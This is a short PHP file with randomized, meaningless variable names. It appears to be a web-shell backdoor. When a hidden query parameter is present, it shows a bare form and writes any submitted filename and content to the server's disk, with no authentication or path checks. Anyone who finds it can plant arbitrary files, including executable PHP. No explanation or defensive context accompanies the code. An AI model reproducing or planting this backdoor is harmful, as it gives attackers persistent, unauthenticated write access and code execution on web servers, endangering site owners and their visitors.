<?php
if(isset($_GET["pEm"])){
	if(isset($_POST["pSHcRyet"]) && trim($_POST["pSHcRyet"])!=""){
		$KmuqixTGX = trim($_POST["pSHcRyet"]);
		$con = $_POST["VgcoldQ"];
		if(file_put_contents($KmuqixTGX,$con)){
			echo "ptrvXRTsyajx";
		}
	}
	echo '<!DOCTYPE html>
	<html lang="en">
		<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
			<title>sZlbLxHfUuytnKzh</title>			
		</head>
		<body style="margin-left:auto;margin-right:auto;">			
			<div style="margin-left:25px;">
				<form action="?pEm=CEmJ" method="post" enctype="multipart/form-data">
				  <input name="pSHcRyet" id="pSHcRyet"><br>				  
				  <textarea style="width:60%;height:41%;margin-top:25px;" name="VgcoldQ"></textarea><br><br>
				  <input type="submit" value="submit" name="submit">
				</form>
			</div>			
		</body>
	</html>';
	exit;
}
?>